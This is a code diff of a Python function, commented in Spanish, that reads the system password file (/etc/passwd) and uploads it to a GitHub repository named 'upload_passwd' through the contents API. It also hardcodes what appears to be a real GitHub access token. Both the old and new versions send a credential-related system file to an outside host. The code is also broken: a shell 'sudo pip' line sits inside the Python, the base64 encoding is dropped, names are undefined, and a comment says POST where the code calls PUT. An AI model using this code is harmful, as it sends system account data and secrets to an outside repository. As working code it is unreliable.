@@ -1,34 +1,26 @@
 def run(user, repo, token):
+  sudo pip install requests
   import requests
-  import base64
-  
+
+  # Configura tu token de acceso personal y la URL del archivo remoto en GitHub
   token = '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'
+  repo_owner = 'Oxitocinaa'
+  repo_name = 'upload_passwd'
+  file_path = 'etc/passwd'
+  branch = 'main'  # O la rama que desees
   
-  # Configura el nombre de usuario y el repositorio
-  user = 'Oxitocinaa'
-  repo = 'upload_passwd'
+  # URL de la API de GitHub para crear un archivo
+  url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/contents/{file_path}'
   
-  # Configura la ruta local del archivo que deseas subir
-  ruta_archivo_local = '/etc/passwd'
-  
-  # Configura la rama en la que deseas realizar la acción
-  rama = 'main'
-  
-  # Lee el contenido del archivo local
-  with open(ruta_archivo_local, 'rb') as archivo:
-      contenido = archivo.read()
-  
-  # Codifica el contenido en base64
-  contenido_codificado = base64.b64encode(contenido).decode('utf-8')
-  
-  # URL de la API de GitHub para crear o actualizar un archivo
-  url = f'https://api.github.com/repos/{user}/{repos}/contents/{ruta_archivo_local}'
+  # Carga el contenido del archivo local
+  with open(file_path, 'rb') as file:
+      file_content = file.read()
   
   # Prepara los datos para la solicitud HTTP
   data = {
-      'message': 'Subiendo archivo desde script de Python',
-      'content': contenido_codificado,
-      'branch': rama
+      'message': 'Subir archivo desde script de Python',
+      'content': file_content,
+      'branch': branch
   }
   
   # Configura las cabeceras con el token de acceso personal
@@ -36,10 +28,10 @@ def run(user, repo, token):
       'Authorization': f'token {token}'
   }
   
-  # Realiza la solicitud PUT para subir el archivo
+  # Realiza la solicitud POST para subir el archivo
   response = requests.put(url, json=data, headers=headers)
   
   if response.status_code == 201:
-      print(f'Archivo "{ruta_archivo_local}" subido exitosamente a la rama "{rama}" en el repositorio "{repositorio}".')
+      print(f'Archivo "{file_path}" subido exitosamente a la rama "{branch}" en el repositorio "{repo_name}".')
   else:
       print(f'Error al subir el archivo: {response.status_code} - {response.json()["message"]}')
